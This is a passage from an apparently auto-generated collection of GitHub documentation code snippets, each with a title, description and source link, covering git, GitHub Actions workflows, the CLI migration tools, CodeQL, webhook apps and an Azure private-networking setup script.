totalSales = 0;\n\nlet applePrice = 3;\nlet applesSold = 100;\ntotalSales += applePrice * applesSold;\n\nlet orangePrice = 5;\nlet orangesSold = 50;\ntotalSales += orangePrice * orangesSold;\n\nconsole.log(`Total: ${totalSales}`);\n```\n\n----------------------------------------\n\nTITLE: Adding YAML frontmatter to a new page - Shell\nDESCRIPTION: This snippet demonstrates the YAML frontmatter required for a new page in a Jekyll site. It includes the layout, title, and permalink, which define the page's structure, title, and URL path, respectively. The 'layout' should be 'page'. The title is enclosed in quotes. The permalink specifies the URL path.\nSOURCE: https://github.com/github/docs/blob/main/content/pages/setting-up-a-github-pages-site-with-jekyll/adding-content-to-your-github-pages-site-using-jekyll.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\nlayout: page\n   title: \"PAGE-TITLE\"\n   permalink: /URL-PATH\n```\n\n----------------------------------------\n\nTITLE: Staging file for commit with git\nDESCRIPTION: This command adds the specified file to the local repository and stages it for commit. The `git add .` command adds all the changed or new files in the current directory to the staging area.\nSOURCE: https://github.com/github/docs/blob/main/content/repositories/working-with-files/managing-files/adding-a-file-to-a-repository.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\n$ git add .\n# Adds the file to your local repository and stages it for commit. {% data reusables.git.unstage-codeblock %}\n```\n\n----------------------------------------\n\nTITLE: Changing Directory with `cd` Command in Shell\nDESCRIPTION: This snippet demonstrates how to change the current working directory in a shell environment.  The `cd` command is used to navigate to the `open-source-projects` directory.  This command is a prerequisite for subsequent git operations.\nSOURCE: https://github.com/github/docs/blob/main/content/pull-requests/collaborating-with-pull-requests/proposing-changes-to-your-work-with-pull-requests/committing-changes-to-a-pull-request-branch-created-from-a-fork.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ncd open-source-projects\n```\n\n----------------------------------------\n\nTITLE: GitHub App Webhook Handler\nDESCRIPTION: This JavaScript snippet demonstrates how to set up a webhook event listener that triggers when a new pull request is opened on GitHub. It utilizes the Octokit library to authenticate with the GitHub API and post a comment on the pull request. It requires the `dotenv`, `octokit`, `fs`, and `http` modules. Note that `@octokit/webhooks` is a dependency of the `octokit` module.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/writing-code-for-a-github-app/building-a-github-app-that-responds-to-webhook-events.md#_snippet_2\n\nLANGUAGE: javascript\nCODE:\n```\n// These are the dependencies for this file.\n//\n// You installed the `dotenv` and `octokit` modules earlier. The `@octokit/webhooks` is a dependency of the `octokit` module, so you don't need to install it separately. The `fs` and `http` dependencies are built-in Node.js modules.\nimport dotenv from \"dotenv\";\nimport {App{% ifversion ghes %}, Octokit{% endif %}} from \"octokit\";\nimport {createNodeMiddleware} from \"@octokit/webhooks\";\nimport fs from \"fs\";\nimport http from \"http\";\n\n// This reads your `.env` file and adds the variables from that file to the `process.env` object in Node.js.\ndotenv.config();\n\n// This assigns the values of your environment variables to local variables.\nconst appId = process.env.APP_ID;\nconst webhookSecret = process.env.WEBHOOK_SECRET;\nconst privateKeyPath = process.env.PRIVATE_KEY_PATH;{% ifversion ghes %}\nconst enterpriseHostname = process.env.ENTERPRISE_HOSTNAME;{% endif %}\n\n// This reads the contents of your private key file.\nconst privateKey = fs.readFileSync(privateKeyPath, \"utf8\");\n\n// This creates a new instance of the Octokit App class.\nconst app = new App({\n  appId: appId,\n  privateKey: privateKey,\n  webhooks: {\n    secret: webhookSecret\n  },{% ifversion ghes %}\n  Octokit: Octokit.defaults({\n    baseUrl: `https://${enterpriseHostname}/api/v3`,\n  }),{% endif %}\n});\n\n// This defines the message that your app will post to pull requests.\nconst messageForNewPRs = \"Thanks for opening a new PR! Please follow our contributing guidelines to make your PR easier to review.\";\n\n// This adds an event handler that your code will call later. When this event handler is called, it will log the event to the console. Then, it will use {% data variables.product.company_short %}'s REST API to add a comment to the pull request that triggered the event.\nasync function handlePullRequestOpened({octokit, payload}) {\n  console.log(`Received a pull request event for #${payload.pull_request.number}`);\n\n  try {\n    await octokit.request(\"POST /repos/{owner}/{repo}/issues/{issue_number}/comments\", {\n      owner: payload.repository.owner.login,\n      repo: payload.repository.name,\n      issue_number: payload.pull_request.number,\n      body: messageForNewPRs,\n      headers: {\n        \"x-github-api-version\": \"{{ allVersions[currentVersion].latestApiVersion }}\",\n      },\n    });\n  } catch (error) {\n    if (error.response) {\n      console.error(`Error! Status: ${error.response.status}. Message: ${error.response.data.message}`)\n    }\n    console.error(error)\n  }\n};\n\n// This sets up a webhook event listener. When your app receives a webhook event from {% data variables.product.company_short %} with a `X-GitHub-Event` header value of `pull_request` and an `action` payload value of `opened`, it calls the `handlePullRequestOpened` event handler that is defined above.\napp.webhooks.on(\"pull_request.opened\", handlePullRequestOpened);\n\n// This logs any errors that occur.\napp.webhooks.onError((error) => {\n  if (error.name === \"AggregateError\") {\n    console.error(`Error processing request: ${error.event}`);\n  } else {\n    console.error(error);\n  }\n});\n\n// This determines where your server will listen.\n//\n// For local development, your server will listen to port 3000 on `localhost`. When you deploy your app, you will change these values. For more information, see [Deploy your app](#deploy-your-app).\nconst port = 3000;\nconst host = 'localhost';\nconst path = \"/api/webhook\";\nconst localWebhookUrl = `http://${host}:${port}${path}`;\n\n// This sets up a middleware function to handle incoming webhook events.\n//\n// Octokit's `createNodeMiddleware` function takes care of generating this middleware function for you. The resulting middleware function will:\n//\n//    - Check the signature of the incoming webhook event to make sure that it matches your webhook secret. This verifies that the incoming webhook event is a valid {% data variables.product.company_short %} event.\n//    - Parse the webhook event payload and identify the type of event.\n//    - Trigger the corresponding webhook event handler.\nconst middleware = createNodeMiddleware(app.webhooks, {path});\n\n// This creates a Node.js server that listens for incoming HTTP requests (including webhook payloads from {% data variables.product.company_short %}) on the specified port. When the server receives a request, it executes the `middleware` function that you defined earlier. Once the server is running, it logs messages to the console to indicate that it is listening.\nhttp.createServer(middleware).listen(port, () => {\n  console.log(`Server is listening for events at: ${localWebhookUrl}`);\n  console.log('Press Ctrl + C to quit.')\n});\n```\n\n----------------------------------------\n\nTITLE: Git Pull Example with SSL Error\nDESCRIPTION: This code snippet showcases a Git pull command that fails due to an SSL certificate problem. The error message explicitly mentions the 'certificate verify failed' issue during access to a remote repository.\nSOURCE: https://github.com/github/docs/blob/main/content/authentication/troubleshooting-ssh/error-ssl-certificate-problem-verify-that-the-ca-cert-is-ok.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\n$ git pull -u github\n> error: SSL certificate problem, verify that the CA cert is OK. Details:\n> error:14090086:SSL routines:SSL3_GET_SERVER_CERTIFICATE:certificate verify failed while accessing https://github.com/tqisjim/google-oauth.git/info/refs\n> fatal: HTTP request failed\n```\n\n----------------------------------------\n\nTITLE: Configure Google Cloud Storage Connection (ghe-config)\nDESCRIPTION: These commands configure the connection settings for Google Cloud Storage (GCS) to be used by GitHub Actions. It requires the service URL, bucket name, HMAC access ID, and HMAC secret. This setup is necessary for GitHub Actions to utilize GCS as external storage for artifacts.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/configure-storage-provider.md#_snippet_3\n\nLANGUAGE: Shell\nCODE:\n```\nghe-config secrets.actions.storage.gcs.service-url \"SERVICE URL\"\n```\n\nLANGUAGE: Shell\nCODE:\n```\nghe-config secrets.actions.storage.gcs.bucket-name \"BUCKET NAME\"\n```\n\nLANGUAGE: Shell\nCODE:\n```\nghe-config secrets.actions.storage.gcs.access-key-id \"HMAC ACCESS ID\"\n```\n\nLANGUAGE: Shell\nCODE:\n```\nghe-config secrets.actions.storage.gcs.access-secret \"HMAC SECRET\"\n```\n\n----------------------------------------\n\nTITLE: Importing from Team Foundation Version Control (Shell)\nDESCRIPTION: This command makes a raw clone of a Team Foundation Version Control project, creating a new Git repository with refs in 'refs/import/'. It requires the URL of the source Team Foundation project and a path for the temporary repository. Replace `TEAM-FOUNDATION-CLONE-URL` and `/PATH/REPO-NAME.git` with the actual TFS clone URL and desired repository path.\nSOURCE: https://github.com/github/docs/blob/main/content/migrations/importing-source-code/using-the-command-line-to-import-source-code/importing-from-other-version-control-systems-with-the-administrative-shell.md#_snippet_6\n\nLANGUAGE: Shell\nCODE:\n```\n$ git-import-tfs-raw TEAM-FOUNDATION-CLONE-URL /PATH/REPO-NAME.git\n# Creates a new repository with one or more Git refs in \"refs/import/\" in the specified path.\n```\n\n----------------------------------------\n\nTITLE: Running a CodeQL Query\nDESCRIPTION: This command executes a CodeQL query against a specified database or dataset. The `--database` option specifies the path to the CodeQL database, and `<file.ql>` represents the QL source code of the query to be executed.  The output is displayed on the terminal by default.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/codeql-cli-manual/query-run.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ncodeql query run (--database=<database> | --dataset=<dataset>) [--output=<file.bqrs>] [--threads=<num>] [--ram=<MB>] <options>... -- <file.ql>\n```\n\n----------------------------------------\n\nTITLE: Reclaiming mannequins in bulk with gh bbs2gh\nDESCRIPTION: This command reclaims mannequins in bulk using a CSV file. The `DESTINATION` parameter specifies the GitHub organization, and `FILENAME.csv` specifies the path to the CSV file containing the mannequin mappings. The CSV file should be generated using the `generate-mannequin-csv` command.\nSOURCE: https://github.com/github/docs/blob/main/content/migrations/using-github-enterprise-importer/completing-your-migration-with-github-enterprise-importer/reclaiming-mannequins-for-github-enterprise-importer.md#_snippet_7\n\nLANGUAGE: Shell\nCODE:\n```\ngh bbs2gh reclaim-mannequin --github-org DESTINATION --csv FILENAME.csv\n```\n\n----------------------------------------\n\nTITLE: Implementing Login Function in Ruby\nDESCRIPTION: The `login` function orchestrates the device flow by calling `request_device_code`, prompting the user to visit the verification URI and enter the user code, and then calling `poll_for_token` to obtain the access token. Finally, it informs the user that authentication was successful. It depends on the `request_device_code` and `poll_for_token` functions.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/writing-code-for-a-github-app/building-a-cli-with-a-github-app.md#_snippet_12\n\nLANGUAGE: ruby\nCODE:\n```\ndef login\n  verification_uri, user_code, device_code, interval = request_device_code.values_at(\"verification_uri\", \"user_code\", \"device_code\", \"interval\")\n\n  puts \"Please visit: #{verification_uri}\"\n  puts \"and enter code: #{user_code}\"\n\n  poll_for_token(device_code, interval)\n\n  puts \"Successfully authenticated!\"\nend\n```\n\n----------------------------------------\n\nTITLE: Git Top Interface (ghe-btop)\nDESCRIPTION: A top-like interface for current Git operations on the server. It allows for monitoring Git activity in real-time.  Accepts an optional port number, `--help`, or `--usage` flags.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/administering-your-instance/administering-your-instance-from-the-command-line/command-line-utilities.md#_snippet_59\n\nLANGUAGE: shell\nCODE:\n```\nghe-btop [ <port number> | --help | --usage ]\n```\n\n----------------------------------------\n\nTITLE: Using Tool Tags in Markdown\nDESCRIPTION: This code snippet demonstrates how to use tool tags in Markdown to create a tool switcher.  Each tag wraps content specific to a particular tool. The `{% raw %}` tags are used to prevent Liquid from rendering the tags.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/writing-for-github-docs/creating-tool-switchers-in-articles.md#_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n{% raw %}{% vscode %}\nThis content is specific to {% endraw %}{% data variables.product.prodname_vscode %}{% raw %}.\n{% endvscode %}\n\n{% visualstudio %}\nThis content is specific to {% endraw %}{% data variables.product.prodname_vs %}{% raw %}.\n{% endvisualstudio %}\n\n{% jetbrains %}\nThis content is specific to JetBrains IDEs.\n{% endjetbrains %}{% endraw %}\n```\n\n----------------------------------------\n\nTITLE: Searching for file content using content: qualifier\nDESCRIPTION: This snippet demonstrates how to use the `content:` qualifier to search for files containing a specific term in their content, excluding matches based on file names or paths.\nSOURCE: https://github.com/github/docs/blob/main/content/search-github/github-code-search/understanding-github-code-search-syntax.md#_snippet_23\n\nLANGUAGE: text\nCODE:\n```\ncontent:README.md\n```\n\n----------------------------------------\n\nTITLE: Configuring GitHub Actions Importer with CLI\nDESCRIPTION: This shell command configures GitHub Actions Importer by prompting the user for credentials and settings, including GitHub PAT, CircleCI API token, and organization name. It stores these configurations as environment variables for subsequent commands.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-circleci-with-github-actions-importer.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ngh actions-importer configure\n```\n\n----------------------------------------\n\nTITLE: Check Git Repository Status (Git rev-parse)\nDESCRIPTION: This command checks if the current directory is inside a Git repository's working tree. It's used to determine how {% data variables.product.prodname_enterprise_backup_utilities %} was installed and how to upgrade it.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/backing-up-and-restoring-your-instance/configuring-backups-on-your-instance.md#_snippet_5\n\nLANGUAGE: shell\nCODE:\n```\ngit rev-parse --is-inside-work-tree\n```\n\n----------------------------------------\n\nTITLE: Sending Copilot Errors SSE - Typescript\nDESCRIPTION: This code snippet illustrates how to send a `copilot_errors` server-sent event (SSE) to the Copilot platform. This SSE is used to report errors encountered by the agent. The data includes the error type (reference, function, or agent), an error code, a message to display to the user, and an identifier to link the error with other resources.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/building-copilot-extensions/building-a-copilot-agent-for-your-copilot-extension/configuring-your-copilot-agent-to-communicate-with-the-copilot-platform.md#_snippet_2\n\nLANGUAGE: typescript\nCODE:\n```\n//\nevent: copilot_errors\ndata: [{\n    // A string that specifies the error's type. `type` can have a value of `reference`, `function` or `agent`.\n    \"type\": \"function\",\n    // A string controlled by the agent describing the nature of an error.\n    \"code\": \"recentchanges\",\n    // A string that specifies the error message shown to the user.\n    \"message\": \"The repository does not exist\",\n    // A string that serves as a unique identifier to link the error with other resources such as references or function calls.\n    \"identifier\": \"github/hello-world\"\n}]\n```\n\n----------------------------------------\n\nTITLE: Creating a Codespaces Badge with Markdown\nDESCRIPTION: This snippet demonstrates how to create an \"Open in GitHub Codespaces\" badge in a Markdown file. The badge links to a specified URL, allowing users to quickly create or resume a codespace for the repository. The `URL` placeholder should be replaced with the actual codespace URL.\nSOURCE: https://github.com/github/docs/blob/main/content/codespaces/setting-up-your-project-for-codespaces/setting-up-your-repository/facilitating-quick-creation-and-resumption-of-codespaces.md#_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n[![Open in GitHub Codespaces](https://github.com/codespaces/badge.svg)](URL)\n```\n\n----------------------------------------\n\nTITLE: Querying Project Items with curl\nDESCRIPTION: This snippet uses curl to query the first 20 items in a GitHub project, including issues, pull requests, and draft issues.  It retrieves field values for text, date, and single select fields within the first 8 fields of the project. The `PROJECT_ID` placeholder needs to be replaced with the actual project ID and `TOKEN` with a personal access token.\nSOURCE: https://github.com/github/docs/blob/main/content/issues/planning-and-tracking-with-projects/automating-your-project/using-the-api-to-manage-projects.md#_snippet_13\n\nLANGUAGE: Shell\nCODE:\n```\ncurl --request POST \\\n  --url https://api.github.com/graphql \\\n  --header 'Authorization: Bearer TOKEN' \\\n  --data '{\"query\":\"query{ node(id: \\\"PROJECT_ID\\\") { ... on ProjectV2 { items(first: 20) { nodes{ id fieldValues(first: 8) { nodes{ ... on ProjectV2ItemFieldTextValue { text field { ... on ProjectV2FieldCommon { name }}} ... on ProjectV2ItemFieldDateValue { date field { ... on ProjectV2FieldCommon { name } } } ... on ProjectV2ItemFieldSingleSelectValue { name field { ... on ProjectV2FieldCommon { name }}}}} content{ ... on DraftIssue { title body } ...on Issue { title assignees(first: 10) { nodes{ login }}} ...on PullRequest { title assignees(first: 10) { nodes{ login }}}}}}}}}\"}'\n```\n\n----------------------------------------\n\nTITLE: Import Migration Archive with GitHub CLI\nDESCRIPTION: This command imports a pre-existing migration archive into GitHub using `gh bbs2gh migrate-repo`. It requires the archive path, GitHub organization, repository name, Bitbucket Server URL, project, repository name, and optional AWS S3 bucket name and target API URL.\nSOURCE: https://github.com/github/docs/blob/main/content/migrations/using-github-enterprise-importer/migrating-from-bitbucket-server-to-github-enterprise-cloud/migrating-repositories-from-bitbucket-server-to-github-enterprise-cloud.md#_snippet_6\n\nLANGUAGE: Shell\nCODE:\n```\ngh bbs2gh migrate-repo --archive-path ARCHIVE-PATH \\\n  --github-org DESTINATION --github-repo NEW-NAME \\\n  --bbs-server-url BBS-SERVER-URL \\\n  --bbs-project PROJECT \\\n  --bbs-repo CURRENT-NAME \\\n  # If you're using AWS S3 as your blob storage provider:\n  --aws-bucket-name AWS-BUCKET-NAME\n  # If you are migrating to {% data variables.enterprise.data_residency_site %}:\n  --target-api-url TARGET-API-URL\n```\n\n----------------------------------------\n\nTITLE: Example output of `codeql resolve packs` command\nDESCRIPTION: This is an example output showing the result of the `codeql resolve packs` command which lists CodeQL packs found within the specified directories. The output includes the pack name, type (library or query), and location. This helps verify correct CLI configuration and diagnose issues with pack discovery.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/getting-started-with-the-codeql-cli/setting-up-the-codeql-cli.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\nSearching directories specified by `--additional-packs`. All directories have equal priority.\n  Searching in:\n    No packs were found at this location.\nSearching directories specified by `--search-path`. Directories are searched in order.\nSearching the root of the CodeQL distribution.\n  Searching in:\n      <extraction root>\n    The following packs were found:\n      codeql/java-all@<version>: (library) <extraction root>/qlpacks/codeql/javat-all/<version>/qlpack.yml\n      codeql/java-queries@<version>: (query) <extraction root>/qlpacks/codeql/java-queries/<version>/qlpack.yml\n      codeql/javascript-all@<version>: (library) <extraction root>/qlpacks/codeql/javascript-all/<version>/qlpack.yml\n      codeql/javascript-queries@<version>: (query) <extraction root>/qlpacks/codeql/javascript-queries/<version>/qlpack.yml\n      codeql/swift-all@<version>: (library) <extraction root>/qlpacks/codeql/swift-all/<version>/qlpack.yml\n      codeql/swift-queries@<version>: (query) <extraction root>/qlpacks/codeql/swift-queries/<version>/qlpack.yml\n...\n```\n\n----------------------------------------\n\nTITLE: Defining a Matrix with OS and Node.js Versions in YAML\nDESCRIPTION: This snippet demonstrates how to define a matrix strategy in a GitHub Actions workflow to run jobs on different operating systems and Node.js versions. It creates a matrix with two operating systems (ubuntu-22.04 and ubuntu-20.04) and three Node.js versions (10, 12, and 14).  Each job runs with a combination of these variables, setting the `runs-on` value and passing the version to the `actions/setup-node` action. The workflow utilizes a 'strategy' section to define a matrix with the keys 'os' and 'version'.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/jobs/multi-dimension-matrix.md#_snippet_0\n\nLANGUAGE: YAML\nCODE:\n```\njobs:\n  example_matrix:\n    strategy:\n      matrix:\n        os: [ubuntu-22.04, ubuntu-20.04]\n        version: [10, 12, 14]\n    runs-on: {% raw %}${{ matrix.os }}{% endraw %}\n    steps:\n      - uses: {% data reusables.actions.action-setup-node %}\n        with:\n          node-version: {% raw %}${{ matrix.version }}{% endraw %}\n```\n\n----------------------------------------\n\nTITLE: Building Xamarin.iOS app with GitHub Actions\nDESCRIPTION: This YAML workflow configures a GitHub Actions job to build a Xamarin.iOS application. It sets the default Xamarin SDK versions, selects a specific Xcode version, sets up the .NET Core SDK, installs dependencies using NuGet, and builds the project using MSBuild. The workflow is triggered on every push.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/building-and-testing/building-and-testing-xamarin-applications.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nname: Build Xamarin.iOS app\n\non: [push]\n\njobs:\n  build:\n\n    runs-on: macos-latest\n\n    steps:\n    - uses: {% data reusables.actions.action-checkout %}\n    - name: Set default Xamarin SDK versions\n      run: |\n        $VM_ASSETS/select-xamarin-sdk-v2.sh --mono=6.12 --ios=14.10\n\n    - name: Set default Xcode 12.3\n      run: |\n        XCODE_ROOT=/Applications/Xcode_12.3.0.app\n        echo \"MD_APPLE_SDK_ROOT=$XCODE_ROOT\" >> $GITHUB_ENV\n        sudo xcode-select -s $XCODE_ROOT\n\n    - name: Setup .NET Core SDK 5.0.x\n      uses: {% data reusables.actions.action-setup-dotnet %}\n      with:\n        dotnet-version: '5.0.x'\n\n    - name: Install dependencies\n      run: nuget restore <sln_file_path>\n\n    - name: Build\n      run: msbuild <csproj_file_path> /p:Configuration=Debug /p:Platform=iPhoneSimulator /t:Rebuild\n```\n\n----------------------------------------\n\nTITLE: Verifying GitHub Enterprise Resource Configuration\nDESCRIPTION: This snippet provides the command to verify the resource configuration of a GitHub Enterprise instance. It requires SSH access to the instance. The command `ghe-system-info` displays various system information, including resource configuration details. The output will show the current system configuration.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/enterprise_installation/configuration-recognized.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nghe-system-info\n```\n\n----------------------------------------\n\nTITLE: Executing a workflow command using echo in Bash\nDESCRIPTION: This snippet demonstrates the general syntax for executing a workflow command using the `echo` command in Bash.  It takes parameters and a command value formatted as a string. The parameters are optional, and the command value is the core instruction.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-what-your-workflow-does/workflow-commands-for-github-actions.md#_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\necho \"::workflow-command parameter1={data},parameter2={data}::{command value}\"\n```\n\n----------------------------------------\n\nTITLE: Checking Dev Container Image in Codespace Terminal (Shell)\nDESCRIPTION: This shell command can be run in the terminal of a codespace to determine if the dev container was built from the default image. The output provides information about the definition ID and source code repository if the default image was used.\nSOURCE: https://github.com/github/docs/blob/main/content/codespaces/troubleshooting/troubleshooting-included-usage.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ndevcontainer-info\n```\n\n----------------------------------------\n\nTITLE: Running the Audit Log Sync Script\nDESCRIPTION: This command executes the sync-audit-log script, which is responsible for updating the audit log data. It's used for local development to generate the necessary data files.\nSOURCE: https://github.com/github/docs/blob/main/src/audit-logs/README.md#_snippet_1\n\nLANGUAGE: typescript\nCODE:\n```\nnpm run sync-audit-log\n```\n\n----------------------------------------\n\nTITLE: Creating an error annotation using the error command in Bash\nDESCRIPTION: This snippet demonstrates how to create an error annotation using the `error` command in a GitHub Actions workflow. It specifies the file and line number where the error occurred, similar to the `core.error` function, but uses the workflow command syntax for Bash.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-what-your-workflow-does/workflow-commands-for-github-actions.md#_snippet_3\n\nLANGUAGE: yaml\nCODE:\n```\n      - name: Create annotation for build error\n        run: echo \"::error file=app.js,line=1::Missing semicolon\"\n```\n\n----------------------------------------\n\nTITLE: Setting an Environment Variable for the Agent URL\nDESCRIPTION: This snippet demonstrates how to set an environment variable for the agent URL. It uses the `export` command in bash to set the `URL` environment variable to the specified URL, e.g., \"http://localhost:3000\".\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/building-copilot-extensions/debugging-your-github-copilot-extension.md#_snippet_4\n\nLANGUAGE: bash\nCODE:\n```\nexport URL=\"http://localhost:3000\"\n```\n\n----------------------------------------\n\nTITLE: Audit CircleCI with include file\nDESCRIPTION: This command audits a CircleCI organization, limiting the audit to only the repositories listed in the specified file.  It requires the `gh actions-importer` tool and a file containing a line-delimited list of repository names.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-circleci-with-github-actions-importer.md#_snippet_15\n\nLANGUAGE: bash\nCODE:\n```\ngh actions-importer audit circle-ci --output-dir ./output/ --include-from repositories.txt\n```\n\n----------------------------------------\n\nTITLE: Mapping TRIGGER_PAYLOAD to GitHub Actions variable\nDESCRIPTION: Maps the GitLab CI environment variable `TRIGGER_PAYLOAD` to the GitHub Actions equivalent `${{ github.event_path }}`. Provides access to payload.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-gitlab-with-github-actions-importer.md#_snippet_55\n\nLANGUAGE: YAML\nCODE:\n```\n${{ github.event_path }}\n```\n\n----------------------------------------\n\nTITLE: Migrating a Single Repository using GitHub CLI\nDESCRIPTION: This command migrates a single repository from a source organization to a destination organization using the GitHub CLI's `gei` extension. It requires the source and destination organizations, source repository name, and target repository name.\nSOURCE: https://github.com/github/docs/blob/main/content/migrations/using-github-enterprise-importer/migrating-between-github-products/migrating-repositories-from-githubcom-to-github-enterprise-cloud.md#_snippet_4\n\nLANGUAGE: shell\nCODE:\n```\ngh gei migrate-repo --github-source-org SOURCE --source-repo CURRENT-NAME --github-target-org DESTINATION --target-repo NEW-NAME\n```\n\n----------------------------------------\n\nTITLE: Testing Nagios Plugin\nDESCRIPTION: This snippet demonstrates how to test the Nagios plugin interactively from the Nagios host to ensure it can successfully execute the `ghe-cluster-status -n` command.  It uses the `check_by_ssh` plugin to connect to the GitHub Enterprise Server node.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-and-managing-your-instance/configuring-clustering/monitoring-the-health-of-your-cluster.md#_snippet_5\n\nLANGUAGE: shell\nCODE:\n```\nnagiosuser@nagios:~$ /usr/lib/nagios/plugins/check_by_ssh -l admin -p 122 -H HOSTNAME -C \"ghe-cluster-status -n\" -t 30\n> OK - No errors detected\n```\n\n----------------------------------------\n\nTITLE: Audit CircleCI without config file\nDESCRIPTION: This command performs an audit of a CircleCI project to find composite actions for conversion, saving a `config.yml` file with the results. The `config.yml` contains a list of converted composite actions that can be used to specify target repositories for migration.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-circleci-with-github-actions-importer.md#_snippet_12\n\nLANGUAGE: bash\nCODE:\n```\ngh actions-importer audit circle-ci --output-dir ./output/\n```\n\n----------------------------------------\n\nTITLE: Azure Resource Configuration Script (Bash)\nDESCRIPTION: This script automates the creation and configuration of Azure resources necessary for GitHub Actions private networking. It sets up a resource group, virtual network, subnet, network security group, and network settings resource. It depends on the Azure CLI (az) being installed and configured with appropriate permissions. Environment variables need to be set before execution.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/azure-vnet-configure-azure-resources-script.md#_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\n#!/bin/bash\n\n# This script creates the following resources in the specified subscription:\n# - Resource group\n# - Network Security Group rules\n# - Virtual network (vnet) and subnet\n# - Network Settings with specified subnet and GitHub {% ifversion ghec %}Enterprise{% else %}Organization {% endif %}database ID\n#\n# It also registers the `GitHub.Network` resource provider with the subscription,\n# delegates the created subnet to the Actions service via the `GitHub.Network/NetworkSettings`\n# resource type, and applies the NSG rules to the created subnet.\n\n# stop on failure\nset -e\n\n#set environment\nexport AZURE_LOCATION=YOUR_AZURE_LOCATION\nexport SUBSCRIPTION_ID=YOUR_SUBSCRIPTION_ID\nexport RESOURCE_GROUP_NAME=YOUR_RESOURCE_GROUP_NAME\nexport VNET_NAME=YOUR_VNET_NAME\nexport SUBNET_NAME=YOUR_SUBNET_NAME\nexport NSG_NAME=YOUR_NSG_NAME\nexport NETWORK_SETTINGS_RESOURCE_NAME=YOUR_NETWORK_SETTINGS_RESOURCE_NAME\nexport DATABASE_ID=YOUR_DATABASE_ID\nexport API_VERSION=2024-04-02\n\n# These are the default values. You can adjust your address and subnet prefixes.\nexport ADDRESS_PREFIX=10.0.0.0/16\nexport SUBNET_PREFIX=10.0.0.0/24\n\necho\necho login to Azure\n. az login --output none\n\necho\necho set account context $SUBSCRIPTION_ID\n. az account set --subscription $SUBSCRIPTION_ID\n\necho\necho Register resource provider GitHub.Network\n. az provider register --namespace GitHub.Network\n\necho\necho Create resource group $RESOURCE_GROUP_NAME at $AZURE_LOCATION\n. az group create --name $RESOURCE_GROUP_NAME --location $AZURE_LOCATION\n\necho\necho Create NSG rules deployed with 'actions-nsg-deployment.bicep' file\n. az deployment group create --resource-group $RESOURCE_GROUP_NAME --template-file ./actions-nsg-deployment.bicep --parameters location=$AZURE_LOCATION nsgName=$NSG_NAME\n\necho\necho Create vnet $VNET_NAME and subnet $SUBNET_NAME\n. az network vnet create --resource-group $RESOURCE_GROUP_NAME --name $VNET_NAME --address-prefix $ADDRESS_PREFIX --subnet-name $SUBNET_NAME --subnet-prefixes $SUBNET_PREFIX\n\necho\necho Delegate subnet to GitHub.Network/networkSettings and apply NSG rules\n. az network vnet subnet update --resource-group $RESOURCE_GROUP_NAME --name $SUBNET_NAME --vnet-name $VNET_NAME --delegations GitHub.Network/networkSettings --network-security-group $NSG_NAME\n\necho\necho Create network settings resource $NETWORK_SETTINGS_RESOURCE_NAME\n. az resource create --resource-group $RESOURCE_GROUP_NAME --name $NETWORK_SETTINGS_RESOURCE_NAME --resource-type GitHub.Network/networkSettings --properties \"{ \\\"location\\\": \\\"$AZURE_LOCATION\\\", \\\"properties\\\" : { \\\"subnetId\\\": \\\"/subscriptions/$SUBSCRIPTION_ID/resourceGroups/$RESOURCE_GROUP_NAME/providers/Microsoft.Network/virtualNetworks/$VNET_NAME/subnets/$SUBNET_NAME\\\", \\\"businessId\\\": \\\"$DATABASE_ID\\\" }}\" --is-full-object --output table --query \"{GitHubId:tags.GitHubId, name:name}\" --api-version $API_VERSION\n\necho\necho To clean up and delete resources run the following command:\necho az group delete --resource-group $RESOURCE_GROUP_NAME\n```\n\n----------------------------------------\n\nTITLE: Retrieving Network Settings Information with Azure CLI\nDESCRIPTION: This `curl` command retrieves network settings information associated with a specific subnet in Azure. It requires an Azure Entra token for authentication and uses the subscription ID, API version, and subnet ID as parameters.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/azure-vnet-hosted-compute-troubleshooting.md#_snippet_4\n\nLANGUAGE: shell\nCODE:\n```\ncurl --request GET \\\n  --url \"https://management.azure.com/subscriptions/{subscriptionId}/providers/GitHub.Network/NetworkSettings?api-version={api-version}&subnetId={subnetId}\" \\\n  --header 'Content-Type: application/json' \\\n  --header \"Authorization: Bearer 